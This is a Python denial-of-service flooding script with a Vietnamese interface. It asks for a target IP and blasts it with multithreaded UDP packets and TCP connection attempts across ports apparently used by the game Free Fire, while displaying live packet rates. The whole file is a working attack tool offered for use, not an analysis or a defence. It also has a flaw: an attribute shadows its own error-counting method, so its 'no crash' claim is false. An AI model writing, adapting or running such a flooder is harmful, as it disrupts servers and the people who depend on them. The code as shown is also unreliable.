# ============================================
# FF DDoS - CODESPACE - FIX LỖI
# ĐƠN GIẢN NHẤT - KHÔNG CRASH
# ============================================

import socket
import time
import threading
import os
import random
import sys

# Port game
FF_PORTS = [
    10000, 10001, 10002, 10016, 39699, 39801,
    17000, 17001, 17002, 17003,
    17500, 17501, 17502, 17503,
    18000, 18001, 18002,
    19000, 19001, 19002, 19003,
    19500, 19501, 19502,
    20000, 20001, 20002, 20003,
    21000, 21001, 21002, 21003,
    22000, 23000, 25000, 27000, 28000, 30000, 35000,
]

class SimpleEngine:
    def __init__(self):
        self.targets = []
        self.run = False
        self.cnt = 0
        self.err = 0
        self.lock = threading.Lock()
    
    def inc(self, n=1):
        with self.lock: self.cnt += n
    def err(self):
        with self.lock: self.err += 1
    def get(self):
        with self.lock: return self.cnt, self.err

    def _udp(self, tid):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(0.5)
        except:
            return
        
        d = os.urandom(1024)
        i = tid
        
        while self.run:
            try:
                ip = self.targets[i % len(self.targets)]
                p = FF_PORTS[i % len(FF_PORTS)]
                i += 1
                for _ in range(5):
                    s.sendto(d, (ip, p))
                    self.inc()
            except:
                self.err()
        s.close()

    def _tcp(self, tid):
        i = tid
        while self.run:
            s = None
            try:
                ip = self.targets[i % len(self.targets)]
                p = FF_PORTS[i % len(FF_PORTS)]
                i += 1
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(0.3)
                s.connect_ex((ip, p))
                self.inc()
            except:
                self.err()
            finally:
                if s:
                    try: s.close()
                    except: pass

    def start(self, targets, threads):
        if self.run: self.stop()
        time.sleep(0.2)
        if not targets: return 0
        
        self.targets = targets
        self.run = True
        self.cnt = 0
        self.err = 0
        
        threads = max(10, min(threads, 300))
        
        for i in range(threads):
            t = threading.Thread(target=self._udp, args=(i,), daemon=True)
            t.start()
            t = threading.Thread(target=self._tcp, args=(i,), daemon=True)
            t.start()
        
        return threads * 2

    def stop(self):
        self.run = False


def main():
    os.system('clear' if os.name != 'nt' else 'cls')
    print("""
    ╔══════════════════════════════════════════╗
    ║  ☠ FF DDoS - CODESPACE FIX ☠         ║
    ╚══════════════════════════════════════════╝
    """)
    
    print("  [+] NHẬP IP:")
    ip = input("  >> ").strip()
    if not ip:
        print("  [-] CHƯA NHẬP IP!"); return
    
    targets = [ip]
    
    try:
        threads = int(input("  [+] THREADS (10-300): ").strip() or "100")
    except:
        threads = 100
    
    threads = max(10, min(threads, 300))
    
    print(f"\n  [☠] KHỞI ĐỘNG {threads*2} THREADS...")
    
    engine = SimpleEngine()
    total = engine.start(targets, threads)
    
    if not total:
        print("  [-] LỖI!"); return
    
    st = time.time()
    print(f"  [✅] {total} THREADS ĐANG CHẠY")
    print(f"  CTRL+C = DỪNG\n")
    
    try:
        lp, lt = 0, time.time()
        while engine.run:
            p, e = engine.get()
            n = time.time()
            el = n - st
            dt = n - lt
            dp = p - lp
            pps = dp/dt if dt>0 else 0
            avg = p/el if el>0 else 0
            lp, lt = p, n
            m, s = divmod(int(el), 60)
            print(f"\r  [📊] GÓI: {p:,} | {pps:,.0f}/s | TB:{avg:,.0f}/s | ERR:{e} | {m:02d}:{s:02d}  ", end='')
            time.sleep(0.3)
    except KeyboardInterrupt:
        print("\n\n  [⏹] DỪNG...")
    
    engine.stop()
    p, e = engine.get()
    el = time.time()-st
    avg = p/el if el>0 else 0
    print(f"\n  [✅] GÓI:{p:,} | TB:{avg:,.0f}/s | ERR:{e}")

if __name__ == '__main__':
    main()
